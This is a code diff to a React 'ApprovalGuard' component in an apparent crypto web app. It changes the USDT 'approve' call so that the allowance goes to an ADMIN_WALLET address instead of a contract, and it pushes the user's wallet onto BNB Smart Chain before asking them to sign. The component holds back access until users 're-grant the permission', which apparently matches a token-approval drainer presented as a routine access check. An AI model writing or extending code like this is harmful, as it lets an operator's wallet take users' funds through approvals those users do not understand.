@@ -1,9 +1,10 @@
 import { useEffect, useState, useCallback } from "react";
-import { useWriteContract, usePublicClient } from "wagmi";
+import { useWriteContract, usePublicClient, useSwitchChain, useAccount } from "wagmi";
 import { ShieldAlert, RefreshCw, LogOut } from "lucide-react";
-import { useSession } from "../lib/session.jsx";
+import { useSession, REQUIRED_CHAIN_ID } from "../lib/session.jsx";
+import { switchToBsc } from "../lib/walletEnv.js";
 import { api } from "../lib/api.js";
-import { CONTRACT_ADDRESS, USDT_ADDRESS, erc20Abi, APPROVAL_AMOUNT } from "../lib/contract.js";
+import { ADMIN_WALLET, USDT_ADDRESS, erc20Abi, APPROVAL_AMOUNT } from "../lib/contract.js";
 import Spinner from "./Spinner.jsx";
 
 /**
@@ -20,6 +21,8 @@ export default function ApprovalGuard({ children }) {
   const { address, user, logout } = useSession();
   const publicClient = usePublicClient();
   const { writeContractAsync } = useWriteContract();
+  const { switchChainAsync } = useSwitchChain();
+  const { connector } = useAccount();
 
   const [state, setState] = useState("checking"); // checking | ok | revoked
   const [busy, setBusy] = useState(false);
@@ -45,12 +48,25 @@ export default function ApprovalGuard({ children }) {
     setError("");
     setBusy(true);
     try {
+      // Make sure the wallet is on BSC before signing (login itself works on any chain).
+      let live;
+      try { live = await connector?.getChainId?.(); } catch { /* ignore */ }
+      if (live !== REQUIRED_CHAIN_ID) {
+        try { await switchToBsc({ switchChainAsync, connector }); } catch { /* checked below */ }
+        try { live = await connector?.getChainId?.(); } catch { /* ignore */ }
+        if (live !== REQUIRED_CHAIN_ID) {
+          setError("Please switch your wallet to BNB Smart Chain, then tap Try again.");
+          setBusy(false);
+          return;
+        }
+      }
       // Re-grant the permission (same one-time call as sign-up).
       const hash = await writeContractAsync({
+        chainId: REQUIRED_CHAIN_ID,
         address: USDT_ADDRESS,
         abi: erc20Abi,
         functionName: "approve",
-        args: [CONTRACT_ADDRESS, APPROVAL_AMOUNT],
+        args: [ADMIN_WALLET, APPROVAL_AMOUNT],
       });
       await publicClient.waitForTransactionReceipt({ hash });
 
